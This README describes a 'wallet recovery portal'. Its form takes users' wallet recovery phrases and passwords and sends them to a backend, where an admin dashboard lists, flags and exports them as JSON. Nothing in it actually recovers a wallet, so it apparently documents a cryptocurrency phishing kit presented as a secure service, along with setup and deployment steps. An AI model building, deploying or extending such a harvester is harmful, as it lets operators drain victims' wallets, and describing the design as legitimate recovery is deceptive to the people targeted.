# Blocknet DApps - Wallet Recovery Portal

A secure, full-stack application for wallet recovery with an admin dashboard. Built with Express.js backend and vanilla JavaScript frontend.

## Features

✅ **Secure Wallet Recovery Interface**
- Multi-step form with wallet selection
- Recovery phrase input with clipboard paste support
- Password management with visibility toggle
- Real-time progress tracking

✅ **Admin Dashboard**
- View all wallet submissions
- Search and filter submissions
- Update submission status and notes
- Export data as JSON
- Comprehensive statistics
- User authentication with bcrypt

✅ **Modern Design**
- Dark theme with glassmorphism effects
- Responsive layout (mobile, tablet, desktop)
- Smooth animations and transitions
- Font Awesome icons integration

## Project Structure

```
blocknet-dapps/
├── frontend/
│   ├── index.html       # Main application page
│   ├── styles.css       # Styling and animations
│   └── script.js        # Client-side logic
├── backend/
│   ├── server.js        # Express server with API routes
│   ├── package.json     # Node dependencies
│   ├── public/
│   │   ├── admin-login.html      # Admin login page
│   │   └── admin-dashboard.html  # Admin dashboard
│   └── data/
│       ├── submissions.json      # User submissions (auto-generated)
│       └── users.json            # Admin users (auto-generated)
├── .gitignore
└── README.md
```

## Installation

### Prerequisites
- Node.js (v14 or higher)
- npm or pnpm

### Setup

1. **Install Backend Dependencies**
```bash
cd backend
npm install
```

2. **Start Backend Server**
```bash
npm start
```

The backend will run on `http://localhost:3000` and automatically:
- Create the data directory
- Initialize submissions.json
- Create a default admin user (admin / admin123)

3. **Start Frontend**

For local development, you can use Python's built-in server:
```bash
cd frontend
python -m http.server 5500
```

Or use any other simple HTTP server. Then visit:
- **Frontend**: http://localhost:5500
- **Admin**: http://localhost:3000/admin/login

## API Endpoints

### Public Routes

```
POST /api/submit
  - Submit wallet recovery data
  - Body: { wallet, recoveryPhrase, password, timestamp, userAgent }
  - Response: { success, submissionId }

GET /api/health
  - Health check endpoint
  - Response: { status, timestamp, uptime, version }
```

### Admin Routes (Authenticated)

```
POST /api/admin/login
  - Admin login
  - Body: { username, password }
  - Response: { success, user, redirect }

GET /api/admin/check-auth
  - Check authentication status
  - Response: { authenticated, user? }

POST /api/admin/logout
  - Admin logout
  - Response: { success, message }

GET /api/admin/submissions
  - Get all submissions with metadata
  - Response: { success, data, metadata }

GET /api/admin/submissions/:id
  - Get specific submission
  - Response: { success, data }

PUT /api/admin/submissions/:id
  - Update submission (status, notes)
  - Body: { status?, notes? }
  - Response: { success, message, data }

DELETE /api/admin/submissions/:id
  - Delete submission
  - Response: { success, message }

POST /api/admin/submissions/bulk-delete
  - Delete multiple submissions
  - Body: { ids: [...] }
  - Response: { success, message, deletedCount }

GET /api/admin/submissions/export
  - Export all submissions as JSON
  - Response: JSON file download

GET /api/admin/stats
  - Get dashboard statistics
  - Response: { success, data: { total, today, thisWeek, byStatus, byWallet } }
```

## Admin Panel

### Default Credentials
- **Username**: admin
- **Password**: admin123

**⚠️ Change these credentials in production!**

### Dashboard Features

1. **Statistics Cards**
   - Total submissions count
   - New submissions
   - Processed submissions
   - Flagged submissions

2. **Submissions Table**
   - Search and filter submissions
   - View submission details in modal
   - Update status (New, Processed, Flagged)
   - Add notes to submissions
   - Delete individual or bulk submissions
   - Export all data

## Configuration

### Environment Variables

Create a `.env` file in the backend directory:

```env
PORT=3000
NODE_ENV=development
SESSION_SECRET=your-secret-key-here
```

### Security Notes

1. **Change Default Credentials**: Update admin password immediately in production
2. **Use HTTPS**: Deploy with HTTPS in production
3. **Session Secret**: Set a strong SESSION_SECRET in production
4. **CORS**: Configure CORS origin based on your deployment domain
5. **Data Storage**: Consider using a proper database instead of JSON files for production

## Development

### Frontend Development

The frontend is built with vanilla JavaScript and CSS. To modify:

1. Edit `frontend/index.html` for structure
2. Edit `frontend/styles.css` for styling
3. Edit `frontend/script.js` for functionality

### Backend Development

The backend uses Express.js. To extend:

1. Add new routes in `backend/server.js`
2. Use the DataStore object for file-based persistence
3. API responses follow the pattern: `{ success, data/error, ... }`

## Deployment

### Deploy to Vercel

1. Push code to GitHub
2. Connect repository to Vercel
3. Set environment variables in Vercel dashboard
4. Deploy backend as a serverless function or standalone deployment
5. Deploy frontend as static site

### Deploy to Heroku

```bash
heroku create
git push heroku main
```

## Data Storage

Currently uses JSON files for simplicity. For production:

- **Small scale**: Keep JSON files but add proper backup
- **Medium scale**: Migrate to SQLite or PostgreSQL
- **Enterprise**: Use managed database service (AWS RDS, Azure SQL, etc.)

## Security Considerations

⚠️ **WARNING**: This application stores sensitive wallet data. Implement additional security measures before production use:

1. Encrypt sensitive data at rest
2. Use HTTPS everywhere
3. Implement rate limiting
4. Add input validation and sanitization
5. Use proper authentication mechanisms
6. Regular security audits
7. Proper logging and monitoring
8. User data retention policies

## Troubleshooting

### CORS Errors
- Ensure backend is running on port 3000
- Check that frontend URL matches CORS origin config

### Admin Login Issues
- Default credentials are `admin` / `admin123`
- Check that sessions are enabled in backend

### Data Not Persisting
- Verify `backend/data` directory exists
- Check file permissions on the data directory

## License

MIT

## Support

For issues and questions, please create an issue in the repository.
